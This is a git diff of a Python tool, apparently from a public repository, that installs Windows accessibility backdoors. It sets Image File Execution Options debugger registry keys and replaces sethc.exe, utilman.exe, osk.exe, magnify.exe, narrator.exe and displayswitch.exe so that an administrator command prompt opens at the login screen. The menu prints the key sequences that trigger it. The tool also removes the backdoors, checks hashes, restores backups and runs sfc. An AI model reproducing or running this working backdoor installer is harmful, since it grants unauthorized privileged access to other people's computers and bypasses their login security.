@@ -1,10 +1,8 @@
 import os
 import winreg
 from config import *
-
-def install_registry_backdoor(path):
+def install_registry_backdoor(path, fileName):
     print(bar)
-    fileName = os.path.basename(path).strip(' ')
     print("Adding " + fileName + " backdoor to registry.")
     try:
         key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, path)
@@ -32,24 +30,23 @@ def install_backdoor(filePath, registryPath):
         print("[R]eturn to Main Menu.")
         choice = input("[>]").lower()
         if choice == 'a':
-            install_registry_backdoor(registryPath)
+            install_registry_backdoor(registryPath, fileName)
             return
         elif choice == 'c':
-            replace_file(filePath)
+            replace_file(filePath, fileName)
             return
         elif choice == 'b':
-            install_registry_backdoor(registryPath)
-            replace_file(filePath)
+            install_registry_backdoor(registryPath, fileName)
+            replace_file(filePath, fileName)
             return
         elif choice == 'm':
             return
         else:
             print("Invalid Input.")
 
-# TODO: Perform initial backup of
-def replace_file(path):
+# TODO: Make backups go to /backups folder
+def replace_file(path, fileName):
     print(bar)
-    fileName = os.path.basename(path).strip(' ')
     print("WARNING: This will copy over " + fileName + "!")
 
     print("Backing up " + fileName + " to the current directory.\nYou can restore from backup by doing [R]emove Backdoor option from the Main Menu.")
@@ -84,6 +81,11 @@ def run_sfc():
         if choice == 'y':
             try:
                 os.system('sfc /Scannow')
+                # findstr /c:"[SR]" %windir%\logs\cbs\cbs.log >%userprofile%\Desktop\sfcdetails.txt
+                cbsLog = open('C:/Windows/Logs/CBS/CBS.txt')
+                for line in cbsLog:
+                    if 'Found :' in line:
+                        print(line)
             except Exception as e:
                 print(e)
             return
@@ -93,40 +95,47 @@ def run_sfc():
             print("Incorrect input.")
 
 
+# TODO: Restore from backups folder
 def backup_restore(path):
-    fileName = os.path.basename(path).strip(' ')
-    print("Attempting to restore " + fileName + " from local backup.")
-    if(sha_is_incorrect(path)):
-        print("Since " + fileName + " has been replaced, the restore from local backup cannot be completed.")
-        run_sfc()
-    else:
-        try:
-            os.system("copy " + fileName + " " + path)
-        except FileNotFoundError as e:
-            print(e)
-            print("File backup not found.")
+    print(bar)
+    if os.path.isfile(path):
+        fileName= os.path.basename(path).strip(' ')
+        print("Attempting to restore " + fileName + " from local backup.")
+        # Check if local backup file has been replaced
+        if(sha_is_incorrect(fileName)):
+            print("Since " + fileName + " has been replaced, the restore from local backup cannot be completed.")
             run_sfc()
+        else:
+            try:
+                os.system("copy " + fileName + " " + path)
+            except FileNotFoundError as e:
+                print(e)
+                print("File backup not found.")
+                run_sfc()
 
-    print(fileName + " backup restore was successful.")
-    sha256 = calculate_sha256(path)
-    print(fileName + " Sha256:\n" + sha256)
+        print(fileName + " backup restore was successful.")
+    else:
+        print("Backup Restore file at path: " + path + " not found.")
 
 
+# TODO: Make more compact
 def sha_is_incorrect(path):
     fileName = os.path.basename(path).strip(' ')
-    print("Validating " + fileName + " hash against cmd.exe, explorer.exe, and powershell.exe hashes")
+    print("Validating " + fileName + " hash against cmd.exe, explorer.exe, and powershell.exe hashes.")
     sha256 = calculate_sha256(path)
-    print(fileName + " Sha256:\n" + sha256)
     if (sha256 == cmdSha):
         print(fileName + " file has been replaced with cmd.exe!")
+        print(fileName + " Sha256:\n" + sha256)
         print("cmd.exe Sha256:\n" + cmdSha)
         return True
     elif(sha256 == explorerSha):
         print(fileName + " file has been replaced with explorer.exe!")
+        print(fileName + " Sha256:\n" + sha256)
         print("explorer.exe Sha256:\n" + explorerSha)
         return True
     elif(sha256 == powershellSha):
         print(fileName + " file has been replaced with powershell.exe!")
+        print(fileName + " Sha256:\n" + sha256)
         print("powershell.exe Sha256:\n" + powershellSha)
         return True
     else:
@@ -146,8 +155,8 @@ def remove_backdoor(path):
     try:
         print("Attempting to open " + fileName + " key.")
         key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registryPath, 0, winreg.KEY_ALL_ACCESS)
-    except Exception as e:
-        print(e)
+    except:
+        print(fileName + " debugger backdoor key not found.")
         return
 
     # key was found
@@ -162,8 +171,6 @@ def remove_backdoor(path):
 
 if __name__ == "__main__":
     print(header)
-    # get the current drive name
-
     while True:
         print(bar)
         print("[I]nstall Backdoor.\n[R]emove Backdoor.\n[C]onfigure Settings.\n[E]xit the Program.")
@@ -203,14 +210,13 @@ if __name__ == "__main__":
             # NOTE: Does not install utilman.exe backdoor, as that would disallow access to the
             # narrator.exe, osk.exe, and magnify.exe backdoors.
             elif choice == 'a':
-                print(
-"""At the login screen, to open the command prompt with Administrator Privileges,
-Perform any of the following:
-[Shift 5 times]
-[Windows Key + U] and select Narrator
-[Windows Key + U] and select On-Screen Keyboard
-[Windows Key + U] and select Magnify
-[Windows Key + P]""")
+                print("At the login screen, to open the command prompt with Administrator Privileges,\n"
+                    "Perform any of the following:\n"
+                    "[Shift 5 times]\n"
+                    "[Windows Key + U] and select 'Narrator'\n"
+                    "[Windows Key + U] and select 'On-Screen Keyboard'\n"
+                    "[Windows Key + U] and select 'Magnify'\n"
+                    "[Windows Key + P]")
                 install_backdoor(sethcPath, sethcRegistryPath)
                 install_backdoor(displaySwitcherPath, displaySwitcherRegistryPath)
                 install_backdoor(magnifierPath, magnifierRegistryPath)
@@ -223,6 +229,7 @@ Perform any of the following:
                 continue
         # remove backdoor
         elif choice == 'r':
+            print("Detecting and removing all backdoors.")
             remove_backdoor(sethcPath)
             remove_backdoor(utilmanPath)
             remove_backdoor(narratorPath)
@@ -230,17 +237,28 @@ Perform any of the following:
             remove_backdoor(magnifierPath)
             remove_backdoor(displaySwitcherPath)
         elif choice == 'c':
-            print("***Under Construction***\nPlease post any suggestions for configuration to www.github.com/gitgiant")
-            print("[D]isable Windows accessibility options in registry. (doesnt work)")
-            print("[E]nable Windows accessibility options in registry. (doesnt work)")
+            # print("[D]isable Windows accessibility options in registry. (currently doesnt work)")
+            # print("[E]nable Windows accessibility options in registry. (currently doesnt work)")
+            print("[B]ackup sethc.exe, utilman.exe, narrator.exe, osk.exe, magnify.exe, and displayswitch.exe")
             print("[P]erform backup restore.")
             print("[R]eturn to the Main Menu.")
             choice = input("[>]").lower()
             # TODO: Registry files do not work
-            if choice == 'd':
-                os.system("AccessibilityOFF.reg")
-            elif choice == 'e':
-                os.system("AccessibilityON.reg")
+            # if choice == 'd':
+            #     os.system("AccessibilityOFF.reg")
+            # elif choice == 'e':
+            #     os.system("AccessibilityON.reg")
+            if choice == 'b':
+                try:
+                    os.system('copy ' + sethcPath + ' ' + cwd + '\\backups\\')
+                    os.system('copy ' + utilmanPath + ' ' + cwd + '\\backups\\')
+                    os.system('copy ' + narratorPath + ' ' + cwd + '\\backups\\')
+                    os.system('copy ' + oskPath + ' ' + cwd + '\\backups\\')
+                    os.system('copy ' + magnifierPath + ' ' + cwd + '\\backups\\')
+                    os.system('copy ' + displaySwitcherPath + ' ' + cwd + '\\backups\\')
+                except Exception as e:
+                    print(e)
+                    continue
             elif choice == 'p':
                 backup_restore(sethcPath)
                 backup_restore(utilmanPath)
